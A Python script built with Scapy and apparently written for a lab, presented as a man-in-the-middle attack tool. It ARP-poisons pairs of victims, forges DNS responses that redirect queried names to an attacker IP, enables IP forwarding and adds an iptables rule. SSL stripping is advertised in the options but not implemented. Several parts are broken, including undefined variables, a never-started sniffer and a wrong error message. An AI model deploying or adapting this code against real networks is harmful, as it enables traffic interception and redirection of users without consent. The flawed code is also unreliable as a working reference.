import sys
from subprocess import Popen, PIPE
# from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import ARP, getmacbyip, Ether
from scapy.sendrecv import sendp, send, sniff, AsyncSniffer

import argparse
import logging
import platform
import threading
import time


# load_layer("tls")

# host_ip = "192.168.56.103"
# target_ip = "192.168.56.101"
#
# host_mac = '08:00:27:d0:25:4b'
#
# ip_to_spoof = '192.168.56.102'
#
# targets = [{'ip': "192.168.56.101"},
#            {'ip': '192.168.56.102'}]


# logging.getLogger('scapy').setLevel(logging.WARNING)

class MitMAttack:

    def __init__(self, args):
        # set arguments for the attack
        self.targets = [{'ip': ip} for ip in args.targets]
        self.arp_poison = args.arp_poison

        self.dns_spoofing_targets = [targets[i] for i in args.dns_spoof] if args.dns_spoof else []
        self.ssl_strip_targets = [targets[i] for i in args.ssl_strip] if args.ssl_strip else []

        self.host_ip = ''
        self.host_mac = ''

        # execute attack
        print('Starting mitm attack')
        # self.main()

    def main(self):
        """Run the attack"""

        self.set_local_settings()
        self.mitm_attack()

        print('Attack is running')

    def get_local_ip(self):
        pass

    def mitm_attack(self):
        """
        Setup continuous arp poisoning and redirect packets between victims via this host
        :param victims: list of ip addresses
        :return:
        """
        # start arp poisoning
        th = threading.Thread(target=self.arp_poison_targets, args=(self.targets,), kwargs={'sleep': 60})
        th.start()
        # arp_poison_targets(victims, sleep=60)
        print('Started, arp poisoning')
        self.dns_sniffer(self.targets[0])

    def arp_poison_targets(self, victims, sleep=0):
        """
        Arp poison the list of victims to redirect traffic towards us
        :param sleep: time to sleep before exiting
        :param victims: list of ip addresses
        :return:
        """
        assert len(victims) >= 2, 'We must have at least 2 victims to poison'
        while True:
            print('Poisoning targets')
            for i in range(len(victims) - 1):
                for j in range(i + 1, len(victims)):
                    # arp poison both ways
                    self.arp_poisoning(victims[i], victims[j])
                    self.arp_poisoning(victims[j], victims[i])
            if sleep > 1:
                time.sleep(sleep)
            else:
                break

    def arp_poisoning(self, target, victim):
        """
        arp poisoning the target arp cache to redirect packets towards the host ip, instead of the victim
        :param target: ip of target to poison
        :param victim: ip of the victim to redirect
        :return:
        """
        if 'mac' not in target.keys():
            target['mac'] = getmacbyip(target['ip'])
        p = Ether(src=self.host_mac) / ARP(hwsrc=self.host_mac, psrc=victim['ip'], hwdst=target['mac'],
                                           pdst=target['ip'])
        sendp(p, iface='enp0s3', verbose=False)

    def dns_sniffer(self, target):
        """
        This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
        :return:
        """

        AsyncSniffer(filter="udp and port 53 and host " + target['ip'], prn=self.get_dsn_spoofer(target))

    def get_dsn_spoofer(self, target):
        def dns_spoofer(self, p):
            """
            This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
            :param p: the packet we received
            :return:
            """
            print(type(p))
            print(p.show())
            if not p.haslayer(IP):
                return

            if (p[IP].src == target['ip'] and
                    p.haslayer(DNS) and
                    p[DNS].qr == 0 and  # DNS Query
                    p[DNS].opcode == 0 and  # DNS Standard Query
                    p[DNS].ancount == 0  # Answer Count
            ):

                print("Sending spoofed DNS response")
                if p.haslayer(IPv6):
                    ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
                else:
                    ip_layer = IP(src=p[IP].dst, dst=p[IP].src)

                # Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
                dns_resp = ip_layer / \
                           UDP(
                               dport=p[UDP].sport,
                               sport=53
                           ) / \
                           DNS(
                               id=p[DNS].id,  # Same as query
                               ancount=1,  # Number of answers
                               qr=1,  # DNS Response
                               ra=1,  # Recursion available
                               qd=(p.getlayer(DNS)).qd,  # Query Data
                               an=DNSRR(
                                   rrname=p[DNSQR].qname,  # Queried host name
                                   rdata=ip_to_spoof,  # IP address of queried host name
                                   ttl=10
                               )
                           )

                # Send the spoofed DNS response
                print(dns_resp.show())
                send(dns_resp, verbose=0)
                print("Resolved DNS request for " + p[DNS].qd.qname + " by " + ip_to_spoof)

    @staticmethod
    def set_local_settings():
        """
        Set local settings of the system to stop forwading ip messages
        :return:
        """
        # Check to see if we are on linux
        if platform.system() == "Linux":
            # Enable IP forwarding
            ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
            ipf_read = ipf.read()
            if ipf_read != '1\n':
                ipf.write('1\n')
            ipf.close()

            # Disable DNS Query forwarding
            firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
            Popen([firewall], shell=True, stdout=PIPE)


if __name__ == '__main__':
    # set commandline options
    class MyParser(argparse.ArgumentParser):
        # custom method to always print help if invalid input
        def error(self, message):
            sys.stderr.write('error: %s\n' % message)
            self.print_help()
            sys.exit(2)


    parser = MyParser(description='A fully fledged tool for ARP poisoning, '
                                  'DNS spoofing and SSL stripping',
                      formatter_class=argparse.RawDescriptionHelpFormatter,
                      epilog='''Example usages:
    mitm_attack.py -targets 192.168.56.101 192.168.56.102 -arp -dns 0 1 
    mitm_attack.py -targets_file targets_ip.txt -dns 0 -ssl 0''')

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-targets', type=str, nargs='*', help='The ip addresses of the targets')
    target_group.add_argument('-targets_file', type=str,
                              help='The name of a file with the ip addresses of the targets on seperate lines')

    parser.add_argument('-arp', '--arp_poison', const=True, default=True, action='store_const',
                        help='If to ARP poison the targets')
    parser.add_argument('-dns', '--dns_spoof', type=int, nargs='*',
                        help='Enumerate for which targets to dns spoof, will also set ARP poison to true')
    parser.add_argument('-ssl', '--ssl_strip', type=int, nargs='*',
                        help='Enumerate for which targets to ssl strip attack, will also set ARP poison to true')
    args = parser.parse_args()

    if args.dns_spoof or args.ssl_strip:
        args.arp_poison = True

    if args.targets_file:
        with open(args.targets_file, 'r') as f:
            targets = [x.strip() for x in f.readlines()]
            targets = [target.strip() for target in targets if target]
            args.targets = targets

    if len(args.targets) < 2:
        parser.error('Number of targets must be <= 2')

    if args.dns_spoof and (len(args.dns_spoof) > len(args.targets) or max(args.dns_spoof) + 1 > len(args.targets)):
        parser.error('Number of dns targets is more than the number of targets')

    if args.ssl_strip and (len(args.ssl_strip) > len(args.targets) or max(args.ssl_strip) + 1 > len(args.targets)):
        parser.error('Number of ssl strip targets is more than the number of targets')

    print(args)

    MitMAttack(args)
